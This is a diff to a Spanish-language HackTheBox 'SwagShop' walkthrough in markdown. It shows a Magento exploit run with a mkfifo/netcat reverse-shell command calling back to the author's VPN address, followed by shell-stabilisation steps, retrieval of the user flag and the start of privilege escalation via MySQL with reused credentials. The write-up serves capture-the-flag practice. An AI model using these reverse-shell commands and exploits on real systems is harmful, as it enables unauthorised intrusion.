@@ -161,39 +161,95 @@ Nosotros vamos a utilizar la de Netcat:
     
 ![Captura de pantalla -2022-05-05 01-46-13](https://user-images.githubusercontent.com/103068924/166850489-e62e07a6-eda5-4ef7-9759-723deff77eec.png)
 
-Pimero preparamos en una terminal a parte, nuestro comando netcat `nc` en escucha por el puerto `8080`.
+Pimero preparamos en una terminal a parte, con nuestro comando netcat `nc` en escucha por el puerto `8080`.
 
     nc -lnvp 8080
+    
+ ![Captura de pantalla -2022-05-05 09-09-31](https://user-images.githubusercontent.com/103068924/166876948-fc9519f0-429a-4a41-b23f-86b89ec86d43.png)
  
 Finalmente especificamos el comando que nos reporta el artículo dentro de nuestro comando anterior, tambien especificamos nuestra Ip (En este caso es nuestra vpn de HTB) y el puerto desde el que nos pondremos en escucha, `8080`.
- 
  
     python3 magento-oneshot.py --command "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.29 8080 >/tmp/f" http://swagshop.htb/index.php
     
 ![Captura de pantalla -2022-05-05 01-47-38](https://user-images.githubusercontent.com/103068924/166876323-c111416f-50ca-4c3a-920a-9ca6ca1ccb0e.png)
 
-Ya tenemos nuestro shell. Pero sigue sin ser funcional del todo. Para poder 
-obtener una shell completa basada en bash, utilizamos los siguientes comandos:
+Ya tenemos nuestro shell. Pero sigue sin ser funcional del todo.
+
+![Captura de pantalla -2022-05-05 09-11-59](https://user-images.githubusercontent.com/103068924/166877544-d98100a1-a769-4b12-bb99-7c22b6411983.png)
+
+Para poder obtener una shell completa basada en bash, utilizamos los siguientes comandos:
 
     script /dev/null -c bash
+    
+ ![Captura de pantalla -2022-05-05 09-12-36](https://user-images.githubusercontent.com/103068924/166877565-7c129c72-ef1d-4e52-bd19-af03d44d4283.png)
 
 Ahora pulsamos `Cntl + z` enviamos el proceso a segundo plano. Y ejecutamos lo siguiente:
+
+![Captura de pantalla -2022-05-05 09-12-53](https://user-images.githubusercontent.com/103068924/166877674-46b7f844-b2ed-47b9-bfac-4c8fbfa0bc57.png)
+
+Ejecutamos el siguiente comando:
     
     stty raw -echo; fg
+    
+![Captura de pantalla -2022-05-05 09-13-31](https://user-images.githubusercontent.com/103068924/166877723-7f1282b0-fe27-4b73-b4a7-e4d72d07e97b.png)
+
     
 Y terminamos reseteando la shell:    
     
     reset xterm
     
-Ahora ya tenemos una shell más estable y potente. Y buscando un poco, encontramos la primera flag.
+ ![Captura de pantalla -2022-05-05 09-17-59](https://user-images.githubusercontent.com/103068924/166877905-58e6f441-7889-4d9d-b1d4-386576924715.png)   
+    
+Ahora ya tenemos una shell más estable y potente. Tambien podemos cerrar la terminal de escucha por `nc` ya que esta 
+shell es independiente y no se nos caerá.
+
+Como vemos la shell nos permite utilizar `Cntrl + c` sin expulsarnos pero aún no nos permite utilizar `Cntrl + l` para
+limpiar la shell y si utilizamos un `nano`, vemos como tampoco aprovecha todo el monitor.
+
+
+
+Aún que con esta shell ya se podría realizar las tareas restantes perfectamente, voy a mostrar como solucionar estos dos pequeños inconvenientes y así tener la shell al 100% funcional.
+
+Para ello primero solucionaremos el problema del `Cntrl +l` de la siguiente manera, si realizamos un `echo $TERM` vemos que tiene el valor `dumb`
+y nosotros queremos que igual que nuestra shell, valga `xterm`:
+
+    echo $TERM
+    
+Vemos como nos reporta `dump`. Para cambiarlo introducimos el siguiente comando:
+
+    TERM=xterm
+    
+Ahora ya podremos limpiar la pantalla mediante `Cntrl + l`. Bien, ya solo falta regular el ancho y la altura de nuesta shell, para ello primero debemos
+conocer que medidas tiene nuestro monitor para porder ajustarlo, para verlo, abrimos una terminal nueva desde nuestros directorio e intruducimos:
+
+    stty size
+    
+Copiamos los dos números. Ahora volvemos a la reverse shell y podemos ver mediante el mismo comando que las proporciones son mucho menores. Para ajustarlo ralizamos lo siguiente:
+
+    stty size
+
+    stty rows 36 columns 133
+
+    stty size
+
+Una vez tengamos todo ajustado, vamos a por las flags. Para conseguir la primera, simplemene nos dirigimos al directorio raiz:
+
+    cd /
+    
+Y vamos a la carpeta `/home/haris` donde econtraremos el primer archivo `user.txt` con la primera flag.    
+    
 
 ![Captura de pantalla -2022-05-05 02-00-48](https://user-images.githubusercontent.com/103068924/166851070-587d9024-b2e2-4ef1-8a4c-2bf342c7b1a6.png)
+
+## Escalada de Privilegios.
 
 Ahora nos faltaría autentificarnos como `root`. Tras comprobar que no funcionan las credenciales previamente recopiladas para conectarnos de forma
 directa como `root`, vamos a tratar de utilizarlas para conectarnos mediante
 `mysql`.
 
     mysql -uroot -p
+    
+![Captura de pantalla -2022-05-05 02-03-56](https://user-images.githubusercontent.com/103068924/166876538-a70e3882-fcc1-41e8-b8e4-bf7df5866ab0.png)
     
 ![Captura de pantalla -2022-05-05 02-04-07](https://user-images.githubusercontent.com/103068924/166851358-ed5dd0e2-c444-4863-b67b-14da258c33a0.png)
 
